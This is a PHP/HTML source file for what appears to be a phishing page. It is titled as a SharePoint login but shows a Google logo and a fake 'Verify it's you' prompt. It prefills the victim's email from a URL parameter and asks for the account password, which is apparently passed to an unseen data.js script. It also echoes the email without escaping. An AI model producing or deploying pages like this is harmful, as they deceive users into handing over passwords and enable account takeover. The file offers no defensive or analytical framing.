<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Login into your sharepoint account</title>
	<link rel="icon" type="icon" href="icon.ico">
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
	<style type="text/css">
		body{
			background:#fff;
			background-size: cover;
			background-repeat: no-repeat;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 450px;
			background: #fff;
		}

		.verify{
			width: 70%;
			margin: auto;
		}

		.verify h4{
			font-family: arial;
		}

		fieldset{
			width: 100%;
			float: right;
			border:2px solid #4285f4;
			border-radius: 5px;
		}

		legend{
			font-size: 10px;
			overflow: hidden;
			width: 30%;
			padding:0px 2px;
			margin: 0px;
		}

		.verify input[type='password']{
			width: 100%;
			float: right;
			border:none;
			height: 40px;
			padding:3px 10px;
		}

		.verify button{
			border:none;
			height: 40px;
			width: 80px;
			float: right;
			margin-top: 2em;
			background: #4285f4;
			border-radius: 5px;
			color: #fff;
		}

		.email-to-verify{
			border:1px solid #000;
			border-radius: 10px;
		}

		.hide{
			display: none;
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="office" id="verify" style="border: 1px solid #eee; border-radius: 5px; padding:50px 0px; width: 500px;">
			<div class="verify" style="text-align: center;">
				<div style="width: 100%; margin-bottom: 10px;">
					<img src="google.png" width="100px">
				</div>
				<div style="width: 100%;">
					<div class="alert alert-danger hide alert1"></div>
				</div>
				<h4>Verify it's you</h4>
				<p>This device isn't recognized. For your security, Google wants to make sure it's really you</p>
			</div>
			<div class="verify">
				<div class="email-to-verify" style="margin-bottom: 5px; text-align: center; font-weight: 700"><?php echo $email; ?></div>
				<input type="hidden" name="email" id="email" value="<?php echo $email; ?>">
				<p style="font-size:13px; float: left; margin-top: 12px; margin-bottom:26px;">Confirm you are the owner of this account by entering your password</p>
			</div>
			<div class="verify">						
				<fieldset>
					<legend>Enter your password</legend>
					<input type="password" id="password" name="password">
				</fieldset>
				<button id="signin">Next</button>
			</div>
		</div>
	</div>
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script src="js/data.js"></script>
</body>
</html>